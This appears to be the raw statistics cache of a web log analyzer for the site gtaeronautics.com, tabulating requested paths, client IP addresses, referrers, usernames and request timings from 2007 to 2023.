I	lRS	1	171	4	/data/admin/ver.txt
I	lRS	1	72	4	/new
I	lRS	1	79	4	/old
I	lRS	1	8	4	/carbuyaction.php
I	lRS	1	312615	220	[not listed: 24113]
L	*FR	2007	12	11	00	52
L	*LR	2023	03	31	23	19
L	*f	-20S	s
L	RS	60	60	14.225.19.86
L	RS	42	42	185.207.109.103
L	RS	36	36	34.89.142.176
L	RS	34	34	20.164.200.183
L	RS	20	20	13.231.247.17
L	RS	18	17	185.81.157.208
L	RS	17	17	108.61.204.113
L	RS	17	17	35.193.0.25
L	RS	17	17	40.80.83.88
L	RS	85	16	20.241.233.77
L	RS	15	15	103.83.81.48
L	RS	10	10	49.51.182.226
L	RS	8	8	45.89.228.232
L	RS	15	8	46.17.41.115
L	RS	8	8	20.244.37.144
L	RS	23	8	157.55.39.225
L	RS	8	8	194.163.155.246
L	RS	16	6	66.249.64.222
L	RS	154	6	162.55.85.223
L	RS	6	5	194.38.23.179
L	RS	447547	184	[not listed: 80168]
K	*FR	2013	12	22	04	20
K	*LR	2023	03	31	23	19
K	*f	-30S	s
K	lRS	1	1100	4	http://gtaeronautics.com/
K	lRS	1	89	3	https://www.google.com
K	lRS	1	1	1	http://gtaeronautics.com/0.php
K	lRS	1	20837	1	http://www.gtaeronautics.com/
K	lRS	1	3	1	http://www.gtaeronautics.com/Upfile_Photo.asp
K	lRS	1	31241	0	[not listed: 4967]
E	*FR	2008	01	06	10	12
E	*LR	2023	03	28	06	18
E	*f	-30S	s
E	lSR	1	2	31	/dev
E	lSR	1	0	168	[not listed: 5]
l	*FR	2008	01	06	10	12
l	*LR	2023	03	28	06	18
l	*f	-20S	s
l	SR	2	2	14.225.19.86
l	SR	0	197	[not listed: 109]
v	*f	-20B	b
v	Rb	463278	63.286	64.41.87.40
v	Rb	657415	36.714	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2023	03	28	06	18
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	21	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2023	03	31	23	19
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	145550	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2023	03	13	15	18
P	*LR	2023	03	31	23	21
P	R	84	0
P	R	0	<= 0.01
P	R	998	0.01-0.02
P	R	39247	0.02-0.05
P	R	82516	0.05-0.1 
P	R	105297	0.1 -0.2 
P	R	110023	0.2 -0.5 
P	R	54420	0.5 -1   
P	R	32160	1-  2 
P	R	13842	2-  5 
P	R	7839	5- 10 
P	R	3375	10- 20 
P	R	11974	20- 60 
P	R	1203	60-120 
P	R	268	120-300 
